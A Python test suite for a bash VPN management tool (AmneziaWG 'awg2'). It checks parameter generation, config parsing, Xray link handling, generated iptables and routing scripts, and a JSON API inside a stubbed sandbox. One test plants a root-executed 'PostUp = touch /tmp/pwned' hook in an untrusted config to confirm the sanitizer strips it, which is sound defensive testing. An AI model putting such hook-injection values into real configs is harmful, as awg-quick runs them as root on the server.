"""
test_toolza.py — проверка собранного awg2 (dist/awg2.sh) без root и без сети.

Функции берутся из самого собранного файла (песочница — sandbox.py): он
подключается в bash как библиотека, пути состояния переводятся во временный
каталог, а системные команды (ip, iptables, systemctl, awg...) подменены
заглушками, которые пишут вызовы в журнал.

Что проверяется:
  • генератор параметров AWG 2.0 / 3.0 / 3.1 — инварианты длин, H1-H4,
    таймеры 3.x;
  • чтение конфигов прежних версий (метки, версия по ключам, подсеть);
  • встроенный helper.py — клиенты, сроки, замена параметров, Xray, exit-ноды;
  • служебные скрипты (emit_script) — синтаксис и запуск: нет «command not
    found», правила iptables ставятся с нужными метками;
  • разбор iptables-save с комментарием в кавычках;
  • машинный API (awg2 api): ответы, очередь, задачи.

Запуск:  python3 tests/test_toolza.py [путь/к/dist/awg2.sh]
Выход:   0 — всё прошло, 1 — есть провалы.
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from sandbox import *  # noqa: E402,F401,F403

# ── 1. Генератор параметров ───────────────────────────────
print("Параметры AWG")
N = 120
for proto in ("2.0", "3.0", "3.1"):
    for profile in ("lite", "standard", "pro"):
        rc, out, err = bash(f'MTU=1280; AUTO_MODE=1; for i in $(seq {N}); do gen_awg_params {profile} {proto} || exit 1; echo "$AWG_PARAMS"; echo ---; done')
        sets = [kv(b) for b in out.split("---") if b.strip()]
        label = f"{proto}/{profile}"
        chk(f"{label}: сгенерировано {N}", rc == 0 and len(sets) == N, err[-300:])
        bad = []
        for p in sets:
            S = [int(p[f"S{i}"]) for i in range(1, 5)]
            jc, jmin, jmax = int(p["Jc"]), int(p["Jmin"]), int(p["Jmax"])
            if not (1 <= jc <= 128 and jmin < jmax):
                bad.append(("J", p))
            if S[3] > 32:
                bad.append(("S4>32", p))
            if abs(S[0] + 56 - S[1]) < 10 or abs(S[0] + 84 - S[2]) < 10 or abs(S[1] + 28 - S[2]) < 10:
                bad.append(("S-коллизия", S))
            H = [p[f"H{i}"] for i in range(1, 5)]
            if proto.startswith("3"):
                if min(S) < 12:
                    bad.append(("S<12", S))
                if H != ["1", "2", "3", "4"]:
                    bad.append(("H", H))
                rat = [int(x) for x in p["RekeyAfterTime"].split("-")]
                rjt = [int(x) for x in p["RejectAfterTime"].split("-")]
                if not (rat[0] < rat[1] < rjt[0] < rjt[1]):
                    bad.append(("таймеры", rat, rjt))
                if ("RandomTrailers" in p) != (proto == "3.1") or ("DisableCookies" in p) != (proto == "3.1"):
                    bad.append(("3.1-ключи", sorted(p)))
                if "HeaderProtectionKey" not in p:
                    bad.append(("HPK", sorted(p)))
            else:
                rng = [tuple(int(x) for x in h.split("-")) for h in H]
                flat = [x for r in rng for x in r]
                if flat != sorted(flat) or flat[-1] > 2**31 - 1 or any(b - a < 1000 for a, b in rng):
                    bad.append(("H-диапазоны", H))
                if any(k in p for k in ("HeaderProtectionKey", "RandomTrailers")):
                    bad.append(("3.x-ключи в 2.0", sorted(p)))
        chk(f"{label}: инварианты", not bad, str(bad[:3]))

rc, out, _ = bash('MTU=1420; AUTO_MODE=1; gen_awg_params pro 3.1 >/dev/null; echo "$MTU"')
chk("MTU 1420 на 3.1 снижается до запаса", rc == 0 and int(out.split()[-1]) < 1420, out)

# ── 2. Конфиги прежних версий ─────────────────────────────
print("Конфиги")
os.makedirs(os.path.join(ROOT, "etc/amnezia/amneziawg"), exist_ok=True)
conf = os.path.join(ROOT, "etc/amnezia/amneziawg/awg0.conf")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('echo "$(server_proto)|$(server_net)|$(server_port)|$(server_region)|$(server_profile)|$(client_suffix)"')
chk("2.0 без метки AWG_PROTO", out.strip() == "2.0|10.23.45.0/24|51820|ru|pro|_awg2", out)
rc, out, _ = bash("clients_tsv")
rows = [r.split("\t") for r in out.strip().splitlines()]
chk("клиенты и метки", [r[0] for r in rows] == ["alice", "bob"] and rows[1][3] == "1", out)
rc, out, _ = bash('conf_marker_set AWG_PROTO 3.1; conf_marker AWG_PROTO; sed -n "1,/^\\[Interface\\]/p" "$SERVER_CONF"')
chk("метка вставляется в шапку", out.splitlines()[0] == "3.1" and "# AWG_PROTO=3.1" in out, out)
# Конфиг без шапки (начинается с [Interface]): «1a» ставила метку внутрь секции, где её не видно
with open(conf, "w") as f:
    f.write(OLD20[OLD20.index("[Interface]"):])
rc, out, _ = bash('conf_marker_set AWG_ENDPOINT vpn.example.com; conf_marker AWG_ENDPOINT; head -1 "$SERVER_CONF"')
chk("метка перед [Interface], когда шапки нет", out.splitlines() == ["vpn.example.com", "# AWG_ENDPOINT=vpn.example.com"], out)
with open(conf, "w") as f:
    f.write(OLD20)
with open(conf, "w") as f:
    f.write(OLD20.replace("H4 = 1610612736-1610620000", "H4 = 4\nHeaderProtectionKey = K=\nRandomTrailers = on"))
rc, out, _ = bash("server_proto")
chk("3.1 по ключам без метки", out.strip() == "3.1", out)

# ── 3. helper.py ──────────────────────────────────────────
print("helper.py")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('py expire-check "$SERVER_CONF" 127.0.0.2/32 "$EXPIRE_STATE_DIR"; py peers "$SERVER_CONF"')
chk("истёкший клиент блокируется", "EXPIRED\tbob\t10.23.45.3/32" in out and "127.0.0.2/32\t1\t10.23.45.3/32" in out, out)
rc, out, _ = bash('py expire-clear "$SERVER_CONF" bob 127.0.0.2/32; py peers "$SERVER_CONF" | grep bob')
chk("разблокировка возвращает адрес", "10.23.45.3/32\t\t\t" in out, repr(out))
rc, out, _ = bash('py peer-del "$SERVER_CONF" PUBALICE=; grep -c "^\\[Peer\\]" "$SERVER_CONF"')
chk("удаление пира", out.split() == ["alice", "1"], out)
rc, out, _ = bash('printf "Jc = 7\\nS1 = 33\\nH1 = 1\\nHeaderProtectionKey = NEW=\\n" | py params-replace "$SERVER_CONF"; '
                  'sed -n "/^\\[Peer\\]/q;p" "$SERVER_CONF"')
p = kv(out)
chk("замена параметров", p.get("Jc") == "7" and p.get("S1") == "33" and p.get("HeaderProtectionKey") == "NEW="
    and "S2" not in p and p.get("PrivateKey") == "sPRIV=" and p.get("Address") == "10.23.45.1/24", out)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\nBOT_PROXY=socks5://127.0.0.1:1080\n')
with open(os.path.join(ROOT, "admins.json"), "w") as f:
    json.dump({"version": 1, "admins": {"33": {}, "22": {}}, "invites": {}}, f)
rc, out, _ = bash('py tg-targets "$BOT_CONF" "$BOT_ADMINS"')
chk("уведомления: владельцы, приглашённые, прокси", out.split("\n")[:5] == ["1:AA", "socks5://127.0.0.1:1080", "11", "22", "33"], out)
os.remove(os.path.join(ROOT, "bot.conf"))

EXIT = os.path.join(TMP, "exit.conf")
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nDNS = 1.1.1.1\nTable = auto\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: Table = off, без DNS", "Table = off" in out and "DNS" not in out and "Table = auto" not in out, out)
# Хуки awg-quick выполняются bash от root — из чужого конфига (вставка, бот, бэкап) их быть не должно
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nPostUp = touch /tmp/pwned\nPreDown = true\n"
            "SaveConfig = true\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: PostUp/PreDown/SaveConfig выброшены", "PostUp" not in out and "PreDown" not in out
    and "SaveConfig" not in out and "Table = off" in out and "Endpoint = 1.2.3.4:51820" in out, out)

# Пиры в записи wireguard-tools: «[Peer] # имя», «[peer]» с отступом, комментарий после значения
LOOSE = os.path.join(TMP, "loose.conf")
with open(LOOSE, "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 10.5.0.1/24\n\n[Peer] # carol\nPublicKey = PC= # note\n"
            "AllowedIPs = 10.5.0.2/32\n\n  [peer]\n# dave\nPublicKey=PD=\nAllowedIPs = 10.5.0.3/32\n")
rc, out, _ = bash(f'py peers "{LOOSE}"')
rows = [r.split("\t") for r in out.strip("\n").split("\n")]
chk("пиры в вольной записи видны, имя — и из заголовка", [r[1] for r in rows] == ["PC=", "PD="]
    and rows[0][2] == "10.5.0.2/32" and [r[0] for r in rows] == ["carol", "dave"], out)
# Таб для read — пробельный разделитель: пустые колонки TSV схлопывались, и пир без имени
# получал в имя ключ, а клиент со сроком — чужое orig_ips (показывался заблокированным)
rc, out, _ = bash(f'SERVER_CONF="{LOOSE}"; clients_name_ip')
chk("clients_name_ip: колонки не съезжают", out.split() == ["carol|10.5.0.2", "dave|10.5.0.3"], out)
TSV = os.path.join(TMP, "peers.tsv")
with open(TSV, "w") as f:
    f.write("alice\tPUBA=\t10.8.0.2/32\t1800000000\t\tnone\n")
rc, out, _ = bash(f'clients_tsv() {{ cat "{TSV}"; }}; clients_psv | {{ IFS="|" read -r name pub aip exp orig rest; echo "$exp|$orig|$rest"; }}')
chk("clients_psv: пустая колонка остаётся пустой", out.strip() == "1800000000||none", out)

# Модуль ядра: в Ubuntu 7.0.0-38 смена API udp_tunnel перенесена частично —
# вызов выбирается по заголовкам ядра, а не по номеру версии
UDP_OLD = ("#if LINUX_VERSION_CODE < KERNEL_VERSION(7, 1, 5)\n#include <net/udp_tunnel.h>\n"
           "#define setup_udp_tunnel_sock(net, sk, sock_cfg) setup_udp_tunnel_sock(net, sk->sk_socket, sock_cfg)\n"
           "#define udp_tunnel_sock_release(sk) udp_tunnel_sock_release(sk->sk_socket)\n#endif\n")
KM = os.path.join(TMP, "kmod", "src")
os.makedirs(os.path.join(KM, "compat"))
with open(os.path.join(KM, "compat/compat.h"), "w") as f:
    f.write("#ifndef _WG_COMPAT_H\n" + UDP_OLD + "#endif\n")
with open(os.path.join(KM, "compat/Kbuild.include"), "w") as f:
    f.write("ccflags-y += -DBASE\n")
rc, out, _ = bash(f'py mod-compat-patch "{KM}"; py mod-compat-patch "{KM}"; py mod-compat-patch "{TMP}"')
with open(os.path.join(KM, "compat/compat.h")) as f:
    comp = f.read()
chk("исходник модуля: правка udp_tunnel один раз, без нужного места — не трогается",
    out.split() == ["patched", "already", "skip"] and "#ifndef COMPAT_UDP_TUNNEL_SETUP_SK" in comp
    and "#ifndef COMPAT_UDP_TUNNEL_RELEASE_SK" in comp and comp.count("setup_udp_tunnel_sock(net, sk->sk_socket") == 1, out + comp)
KT = os.path.join(TMP, "ktree", "include", "net")
os.makedirs(KT)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # как в Ubuntu 7.0.0-38
    f.write("void setup_udp_tunnel_sock(struct net *net, struct sock *sk,\n\t\t\t   struct udp_tunnel_sock_cfg *sock_cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
MK = os.path.join(TMP, "kmod", "probe.mk")
with open(MK, "w") as f:
    f.write(f"include {KM}/compat/Kbuild.include\nall:\n\t@echo $(ccflags-y)\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: make разбирает проверку, флаг — только у перенесённого вызова",
    r.returncode == 0 and r.stdout.split() == ["-DBASE", "-DCOMPAT_UDP_TUNNEL_SETUP_SK"], r.stdout + r.stderr)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # прежний API (6.8, 7.0.0-34)
    f.write("void setup_udp_tunnel_sock(struct net *net, struct socket *sock,\n\t\t\t   struct udp_tunnel_sock_cfg *cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: прежний API — флагов нет, модуль собирается как раньше",
    r.returncode == 0 and r.stdout.split() == ["-DBASE"], r.stdout + r.stderr)

# «√ ОС:» в установке: OS_LABEL, найденный внутри $(os_supported), в оболочку не возвращается
rc, out, _ = bash('OS_ID=""; why=$(os_supported); echo "до=[$OS_LABEL]"; OS_ID=""; os_detect; echo "после=[$OS_LABEL]"')
chk("название ОС для «√ ОС:» — после os_detect, не из подоболочки",
    "до=[]" in out and re.search(r"после=\[\S.+\]", out), out)
rc, out, _ = bash("declare -f do_install | sed -n '1,12p'")
chk("do_install определяет ОС до проверки", out.find("os_detect") != -1 and out.find("os_detect") < out.find("os_supported"), out)

# Мастер создания сервера: регион — выбором 1/2, Enter и Ctrl+D — Европа / мир
picked = [bash('_choose_region; echo "R=$S_REGION"', stdin=s)[1].strip().splitlines()[-1] for s in ("2\n", "\n", "")]
chk("регион сервера: 2 — Россия, Enter и Ctrl+D — мир", picked == ["R=ru", "R=world", "R=world"], picked)
rc, out, _ = bash('S_NET=""; _choose_net; echo "N=$S_NET"', stdin="2\n\n")
chk("подсеть вручную: пустой ввод — случайная, мастер не обрывается",
    rc == 0 and re.search(r"N=10\.\d+\.\d+\.0/24$", out.strip()), out)

# Валидаторы: ведущие нули — отказ, а не восьмеричное число или ошибка арифметики
rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
                    'valid_cidr 10.0.0.0/08 || echo d; valid_cidr 10.0.0.0/33 || echo e; '
                    'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
    and "too great" not in err and "syntax error" not in err, out + err)

WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WG), exist_ok=True)
with open(WG, "w") as f:
    f.write("[Interface]\nPrivateKey = S\nListenPort = 5\n\n[Peer]\n# client=a\nPublicKey = A\nAllowedIPs = 10.77.1.2/32\n\n"
            "[Peer]\n# client=b\nPublicKey = B\nAllowedIPs = 10.77.1.3/32\n\n"
            "[Peer]\n# client=c\nPublicKey = C\nAllowedIPs = 10.77.1.4/32\n")
rc, out, _ = bash("wgobf_delete_client b >/dev/null && wgobf_clients")
with open(WG) as f:
    wg = f.read()
chk("WG + обфускатор: удаляется ровно свой [Peer]", out.split() == ["a", "c"] and "PublicKey = B" not in wg
    and "PublicKey = A" in wg and "PublicKey = C" in wg and wg.startswith("[Interface]\nPrivateKey = S"), wg)

rc, out, _ = bash('printf "10.10.0.0/16\\n10.20.1.1/24\\n" | py pick-net awg')
net = out.strip()
chk("свободная подсеть", re.match(r"^10\.\d+\.\d+\.0/24$", net) and not net.startswith("10.10.")
    and not net.startswith("10.20.1."), net)
rc, out, _ = bash("py allowed-except 1.2.3.4")
chk("AllowedIPs без адреса сервера", "1.2.3.4/32" not in out and "1.2.3.5/32" in out and out.strip().endswith("::/0"), out[:120])

VLESS = ("vless://11111111-2222-3333-4444-555555555555@ex.example.com:443?type=xhttp&security=reality"
         "&pbk=PBK&sid=ab&sni=www.site.com&fp=chrome&path=%2Fp&mode=auto&flow=#test")
rc, out, _ = bash(f"py xray-link '{VLESS}'")
ob = json.loads(out) if rc == 0 else {}
ss = ob.get("streamSettings", {})
chk("vless reality + xhttp", ob.get("protocol") == "vless" and ss.get("network") == "xhttp"
    and ss.get("realitySettings", {}).get("publicKey") == "PBK" and ss.get("xhttpSettings", {}).get("path") == "/p", out)
XC = os.path.join(TMP, "xray.json")
rc, out, err = bash(f'''py xray-default "{XC}"
py xray-link '{VLESS}' | py xray-add "{XC}"
py xray-link '{VLESS.replace("ex.example.com", "two.example.com")}' | py xray-add "{XC}"
py xray-prepare "{XC}" tun2socks
py xray-balancer "{XC}" leastPing
py xray-ru "{XC}" on
cat "{XC}"''')
xc = json.loads(out) if rc == 0 else {}
rules = xc.get("routing", {}).get("rules", [])
chk("Xray: два выхода, балансировщик, РФ напрямую",
    len([o for o in xc.get("outbounds", []) if o["protocol"] == "vless"]) == 2
    and xc["routing"]["balancers"][0]["strategy"]["type"] == "leastPing"
    and sum(1 for r in rules if r.get("ruleTag") == "ru-direct") == 2
    and rules[-1].get("balancerTag") == "balancer"
    and all(i.get("protocol") != "tun" for i in xc["inbounds"]), err or out[:300])
rc, out, _ = bash(f'py xray-del "{XC}" proxy_two_example_com; py xray-prepare "{XC}" native; cat "{XC}"')
xc = json.loads(out)
chk("Xray: удаление выхода чинит балансировщик", not xc["routing"].get("balancers")
    and any(i.get("protocol") == "tun" for i in xc["inbounds"])
    and all(r.get("outboundTag") != "proxy_two_example_com" for r in xc["routing"]["rules"]), out[:300])

# ── Xray: пробы на бинаре ─────────────────────────────────
# Заглушка ведёт себя как Xray 26.x: формат конфига — по расширению, без
# «.json» отказ; hysteria2 не знает, inbound tun умеет.
XRAY_STUB = os.path.join(TMP, "xray-stub")
with open(XRAY_STUB, "w") as f:
    f.write(r"""#!/usr/bin/env bash
[[ "$1" == version ]] && { echo "Xray 26.3.27 (Xray, Penetrates Everything.)"; exit 0; }
f=""; while (( $# )); do [[ "$1" == -c ]] && { f="$2"; shift; }; shift; done
[[ "$f" == *.json ]] || { echo "Failed to start: main: failed to load config files: [$f] > core: Failed to get format of $f"; exit 23; }
python3 -c 'import json, os, sys
c = json.load(open(sys.argv[1]))
if any(o.get("protocol") == "hysteria2" for o in c.get("outbounds", [])):
    print("infra/conf: unknown config id: hysteria2"); sys.exit(23)
# Проверка с inbound tun создаёт устройство: занятое имя — отказ, как у Xray
busy = open(os.environ["LINKS"]).read().split()
for ib in c.get("inbounds", []):
    if ib.get("protocol") == "tun" and (ib.get("settings") or {}).get("name", "xray0") in busy:
        print("Failed to start: main: failed to create server > device or resource busy"); sys.exit(23)' "$f" || exit 23
""")
os.chmod(XRAY_STUB, 0o755)
XRAY_ENV = (f'XRAY_BIN="{XRAY_STUB}"; XRAY_DIR="{ROOT}/etc/xray"; XRAY_CONF="$XRAY_DIR/config.json"; '
            'mkdir -p "$XRAY_DIR"; [[ -f "$XRAY_CONF" ]] || py xray-default "$XRAY_CONF"; ')
VLESS_TCP = ("vless://0378c8eb-6544-478e-837d-c3599ef8e73d@dash.example.site:8443?alpn=h2%2Chttp%2F1.1"
             "&encryption=none&flow=xtls-rprx-vision&fp=chrome&security=tls&sni=dash.example.site&type=tcp#NL_Vless")
rc, out, _ = bash(XRAY_ENV + f"xray_add_link '{VLESS_TCP}' && xray_tags")
chk("Xray: vless-ссылка добавляется (проба в .json)", rc == 0 and "proxy_dash_example_site" in out, out)
rc, out, _ = bash(XRAY_ENV + "xray_tun_supported && echo tun-yes; xray_bad_outbounds | sed 's/^/BAD:/'")
chk("Xray: inbound tun определяется, годный выход не считается плохим", "tun-yes" in out and "BAD:" not in out, out)
with open(LINKS, "w") as f:
    f.write("xray0\n")
rc, out, _ = bash(XRAY_ENV + 'py xray-prepare "$XRAY_CONF" native; xray_test && echo TEST-OK; '
                  '_XRAY_TUN=""; xray_tun_supported && echo TUN-YES')
open(LINKS, "w").close()
chk("Xray работает (xray0 занят): проверка конфига и проба tun не упираются в busy",
    "TEST-OK" in out and "TUN-YES" in out, out)
rc, out, _ = bash(XRAY_ENV + "xray_add_link 'hysteria2://secret@h2.example.site:443?sni=h2.example.site#H2'")
chk("Xray: неподдерживаемый hysteria2 отклонён с подсказкой", rc != 0 and "hysteria2 есть не во всех" in out, out)
rc, out, _ = bash(XRAY_ENV + "xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'"
                  " >/dev/null; xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'")
chk("Xray: подсказка про hysteria2 только для hysteria2", "hysteria2 есть не во всех" not in out, out)

# ── 4. Служебные скрипты ──────────────────────────────────
print("Служебные скрипты")
with open(conf, "w") as f:
    f.write(OLD20)
with open(LINKS, "w") as f:
    f.write("awg0\ntun0\nxray0\nwarp0\nawg-exit-de\nawg-exit-nl\n")
os.makedirs(os.path.join(ROOT, "etc/awg-cascade"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf"), "w") as f:
    f.write("udp|443|5.6.7.8|443|de\ntcp|8443|5.6.7.8|443|\n")
for n in ("de", "nl"):
    open(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf"), "w").close()
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state"), "w") as f:
    f.write("active\nmode=peers\nbalancer=ecmp\nsingle_exit=\n")
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list"), "w") as f:
    f.write("10.23.45.2|nl\n10.23.45.3\n")
os.makedirs(os.path.join(ROOT, "etc/awg-wgobf"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-wgobf/state"), "w") as f:
    f.write("NET=10.77.1.0/24\nWG_PORT=40001\nPORT=40000\n")
with open(os.path.join(TMP, "warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 172.16.0.2/32, 2606::1/128\nMTU = 1280\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")

rc, out, err = bash(f'''
WARP_CONF="{TMP}/warp0.conf"
_dns_emit_helpers && _cascade_persist && _exits_write_unit && expire_install >/dev/null
emit_script "$T2S_ROUTING_SCRIPT" 't2s_routing_run "$@"' T2S_IF T2S_TABLE T2S_ADDR "${{RT_FUNCS[@]}}" t2s_routing_run
emit_script "$XRAY_ROUTING_SCRIPT" 'xray_routing_run "$@"' XRAY_IF XRAY_TABLE XRAY_PEERS XRAY_TUN_ADDR XRAY_SOCKS socks_probe "${{RT_FUNCS[@]}}" xray_routing_run
emit_script "$WGOBF_FW" 'wgobf_fw_run "$@"' WGOBF_STATE WGOBF_TAG WGOBF_IF ipt_del_grep ipt_del_tagged wgobf_get wgobf_fw_run
emit_script "$WARP_AUTOSTART_SCRIPT" 'warp_wg_bringup' WARP_CONF WARP_IF WARP_TABLE WARP_PEERS "${{RT_FUNCS[@]}}" warp_wg_bringup
emit_script "$WARP_HEALTH_SCRIPT" 'warp_health_run' WARP_IF WARP_TABLE WARP_STATE WARP_BACKEND_FILE WARP_HEALTH_LOG "${{RT_FUNCS[@]}}" warp_health_run
emit_script "$USQUE_UP_HOOK" 'usque_on_connect' WARP_IF WARP_TABLE WARP_PEERS USQUE_LOG "${{RT_FUNCS[@]}}" usque_on_connect
ls "{ROOT}/scripts"''')
scripts = out.split()
chk("скрипты сгенерированы", rc == 0 and len(scripts) == 11, err + out)
for s in scripts:
    r = subprocess.run(["bash", "-n", os.path.join(ROOT, "scripts", s)], capture_output=True, text=True)
    chk(f"bash -n {s}", r.returncode == 0, r.stderr)

SCR = lambda n: os.path.join(ROOT, "scripts", n)
NOT_FOUND = re.compile(r"command not found|unbound variable")


def run_and_check(label, script, *args, must=(), must_not=()):
    reset_calls()
    rc, out, err = run_script(SCR(script), *args)
    log = calls()
    missing = [m for m in must if not re.search(m, log)]
    present = [m for m in must_not if re.search(m, log)]
    chk(label, not NOT_FOUND.search(err) and not missing and not present,
        f"rc={rc} err={err.strip()[-300:]} нет: {missing} лишнее: {present}")


run_and_check("DNS: перехват и блок DoT в mangle", "DNS_PERSIST_SCRIPT",
              must=[r"-t nat -A PREROUTING -i awg0 -p udp --dport 53 -j DNAT --to-destination 127\.0\.2\.1:53 -m comment --comment awg2-dns",
                    r"-t mangle -A PREROUTING -i awg0 -p tcp --dport 853 -j DROP -m comment --comment awg2-dns",
                    r"-t filter -I INPUT 1 -i awg0 -d 127\.0\.2\.1"])
run_and_check("DNS: health-check", "DNS_HEALTH_SCRIPT", must=[r"-t nat -A PREROUTING"])
run_and_check("Каскад: только адреса сервера, туда и обратно", "CASCADE_SCRIPT",
              must=[r"-t nat -A PREROUTING -p udp --dport 443 -m addrtype --dst-type LOCAL -j DNAT --to-destination 5\.6\.7\.8:443 -m comment --comment awg-cascade:udp-443",
                    r"-I FORWARD 1 -p tcp -s 5\.6\.7\.8 --sport 443 -j ACCEPT -m comment --comment awg-cascade:tcp-8443"])
run_and_check("tun2socks: вся подсеть в таблицу 100", "T2S_ROUTING_SCRIPT", "start",
              must=[r"ip rule add from 10\.23\.45\.0/24 lookup 100 priority 100", r"MASQUERADE -m comment --comment awg2-tun-tun0"])
run_and_check("Xray: клиенты из списка в таблицу 201", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip route replace default dev xray0 table 201"])
run_and_check("Exit-ноды: ECMP и персональная нода", "EXITS_SCRIPT", "start",
              must=[r"nexthop dev awg-exit-de weight 1 nexthop dev awg-exit-nl weight 1",
                    r"ip route replace default dev awg-exit-nl table 211",
                    r"ip rule add from 10\.23\.45\.2 lookup 211 priority 202",
                    r"ip rule add from 10\.23\.45\.3 lookup 202 priority 202"])
run_and_check("Exit-ноды: остановка", "EXITS_SCRIPT", "stop", must_not=[r"-A "])
run_and_check("WG+обфускатор: правила по метке", "WGOBF_FW", "up",
              must=[r"-I INPUT 1 -p udp --dport 40001 ! -i lo -j DROP -m comment --comment awg-wgobf",
                    r"-t nat -A POSTROUTING -s 10\.77\.1\.0/24 ! -o wgobf0 -j MASQUERADE"])
run_and_check("usque on-connect", "USQUE_UP_HOOK", must=[r"table 200"])
run_and_check("Сроки клиентов", "EXPIRE_BIN", must=[r"awg-quick strip awg0"])
with open(conf) as f:
    chk("истёкший клиент заблокирован скриптом таймера", "AllowedIPs = 127.0.0.2/32" in f.read())
with open(LINKS, "w") as f:
    f.write("awg0\n")
run_and_check("WARP: подъём warp0 только с IPv4", "WARP_AUTOSTART_SCRIPT",
              must=[r"ip link add dev warp0 type wireguard", r"ip -4 addr add 172\.16\.0\.2/32 dev warp0",
                    r"ip route replace default dev warp0 src 172\.16\.0\.2 table 200"],
              must_not=[r"2606::1"])

# ── 5. Разбор iptables-save ───────────────────────────────
print("iptables-save")
with open(IPT_SAVE, "w") as f:
    f.write('-A PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment "awg-cascade:udp-443" -j DNAT --to-destination 5.6.7.8:443\n'
            '-A PREROUTING -p udp -m udp --dport 4430 -m comment --comment "awg-cascade:udp-4430" -j DNAT --to-destination 5.6.7.8:4430\n'
            '-A POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE\n')
reset_calls()
bash("cascade_unapply udp 443")
log = calls()
chk("правило с комментарием в кавычках удаляется, соседнее — нет",
    "-D PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment awg-cascade:udp-443 -j DNAT" in log
    and "4430" not in log, log)
reset_calls()
bash("rt_fw_down tun0")
chk("метка туннеля", "-t nat -D POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE" in calls(), calls())

# ── 6. CLI без root ───────────────────────────────────────
print("CLI")
r = subprocess.run(["bash", AWG2, "--version"], capture_output=True, text=True)
chk("--version", r.returncode == 0 and r.stdout.startswith("awg2 v"), r.stdout + r.stderr)
r = subprocess.run(["bash", AWG2, "--help"], capture_output=True, text=True)
chk("--help", r.returncode == 0 and "--tunnel" in r.stdout and "--wgobf" in r.stdout, r.stderr)
head = open(AWG2, encoding="utf-8").read(4096)
chk("VERSION в первых 4 КБ (самообновление и бот)", re.search(r'^VERSION="v\d+\.\d+\.\d+"$', head, re.M) is not None)

# ── 7. Машинный API (awg2 api) ────────────────────────────
print("API")
API_WRAP = api_wrapper()
with open(conf, "w") as f:
    f.write(OLD20)
for n in ("alice", "bob"):
    with open(os.path.join(ROOT, "root", n + "_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\n")


def api(*args, stdin=None, env=None):
    # stdin — открытый пайп: API обязан не ждать его без нужды
    r = subprocess.run([API_WRAP, *args], input=stdin, capture_output=True, text=True,
                       env=dict(ENV, **(env or {})), timeout=120)
    lines = r.stdout.strip().splitlines()
    try:
        res = json.loads(lines[-1]) if len(lines) == 1 else {"raw": r.stdout}
    except ValueError:
        res = {"raw": r.stdout}
    res["_rc"] = r.returncode
    res["_err"] = r.stderr
    return res


r = api("version")
chk("api version — одна строка JSON", r.get("ok") is True and r["data"]["version"].startswith("v")
    and r["data"]["api"] == 1, r)
SLOW = os.path.join(TMP, "slowbin")
os.makedirs(SLOW)
with open(os.path.join(SLOW, "curl"), "w") as f:
    f.write("#!/usr/bin/env bash\nsleep 6\nexit 1\n")
os.chmod(os.path.join(SLOW, "curl"), 0o755)
t0 = time.time()
r = api("status", env={"PATH": SLOW + ":" + ENV["PATH"]})
chk("фоновая проверка обновлений не держит ответ", r.get("ok") and time.time() - t0 < 5, time.time() - t0)
d = r.get("data") or {}
chk("api status", r.get("ok") and d["server"]["exists"] and d["server"]["clients"] == 2
    and d["server"]["proto"] == "2.0" and d["tunnels"]["warp"] == "none", r)
r = api("clients", "list")
rows = r.get("data") or []
chk("api clients list", [c["name"] for c in rows] == ["alice", "bob"] and rows[0]["ip"] == "10.23.45.2"
    and rows[0]["file"].endswith("alice_awg2.conf") and rows[1]["expires"] == 1 and rows[0]["warp"] is None, r)
r = api("client", "add", "carol", "expire=+1d", "mimicry=none")
d = r.get("data") or {}
chk("api client add", r.get("ok") and d.get("name") == "carol" and "[Interface]" in d.get("text", ""), r)
r = api("client", "add", "carol", "mimicry=none")
chk("занятое имя — ошибка с текстом", r.get("ok") is False and r["rc"] == 1 and "carol" in r["error"], r)
rows = api("clients", "list").get("data") or []
carol = next((c for c in rows if c["name"] == "carol"), {})
